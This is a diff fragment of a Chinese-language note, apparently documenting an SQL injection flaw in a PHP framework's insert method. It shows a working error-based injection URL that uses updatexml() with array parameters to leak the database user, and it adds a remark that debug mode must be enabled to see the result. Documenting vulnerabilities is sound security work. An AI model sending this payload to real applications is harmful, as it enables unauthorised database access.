@@ -222,3 +222,4 @@ insert是直接替换的字符串，使用如下触发sql注入
 ```
 /index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
 ```
+需要开启app_debug才能看到报错注入。
